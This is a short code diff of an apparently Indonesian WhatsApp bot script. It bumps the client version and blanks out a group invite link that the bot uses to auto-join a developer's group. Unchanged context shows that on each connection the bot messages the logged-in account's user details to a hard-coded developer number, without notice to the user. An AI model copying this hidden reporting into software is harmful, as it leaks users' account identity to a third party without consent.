@@ -63,7 +63,7 @@ const sleep = async (ms) => {
 }
 const starts = async (client = new WAConnection()) => {
   client.logger.level = "warn";
-  client.version = [2, 2140, 12];
+  client.version = [2, 2142,12];
   client.browserDescription = ["hehe boy", "Chrome", "3.0"];
   console.log(banner.string);
   client.on("qr", () => {
@@ -107,7 +107,7 @@ console.log(color(`${spc4}< ================================================== >
   });
 await client.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/LutirqZqHYKG5RpbpQO96C`
+ teks = `p`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
  client.sendMessage(`6281314050985@s.whatsapp.net`, `*Hai Owner Rival, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6281314050985?text=Assalamualaikum"}}})
